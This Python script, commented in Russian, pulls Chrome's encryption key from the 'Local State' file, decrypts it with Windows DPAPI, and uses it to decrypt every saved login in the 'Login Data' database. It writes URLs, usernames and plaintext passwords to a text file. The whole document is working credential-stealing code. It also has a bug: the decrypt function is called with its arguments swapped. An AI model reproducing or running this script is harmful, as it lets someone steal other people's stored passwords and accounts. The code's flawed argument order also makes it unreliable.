import os.path
import shutil
from datetime import datetime, timedelta
import os.path
from Crypto.Cipher import AES
import os.path
import os
import json
import win32crypt
import base64
import sqlite3


def decrypt_password(key, password):
    try:
        # получить вектор инициализации
        iv = password[3:15]
        password = password[15:]
        # генерировать шифр
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # расшифровать пароль
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            print(e, "")


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # декодировать ключ шифрования из Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # удалить DPAPI str
    key = key[5:]
    # вернуть расшифрованный ключ, который был изначально зашифрован
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def get_chrome_datetime(chromedate):
    """Вернуть объект datetime.datetime из формата datetime в chrome
    Поскольку `chromedate` форматируется как количество микросекунд с января 1601 г."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def main():
    f = open('decrypted_passwords.txt', 'w')
    # получить ключ AES
    key = get_encryption_key()
    # локальный путь к базе данных sqlite Chrome
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # копируем файл в другое место
    # поскольку база данных будет заблокирована, если в данный момент запущен Chrome
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # подключение к БД
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # таблица logins содержит нужные нам данные
    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, "
        "date_last_used FROM logins order by date_created")
    # перебор всех строк
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        if username or password:
            f.write(f"Action URL: {action_url}" + '\n')
            f.write(f"Username: {username}" + '\n')
            f.write(f"Password: {password}" + '\n')

    cursor.close()
    db.close()
    try:
        # попробуйте удалить скопированный файл db
        os.remove(filename)
    except Exception as e:
        print(e, "%e no deleted")


if __name__ == "__main__":
    main()
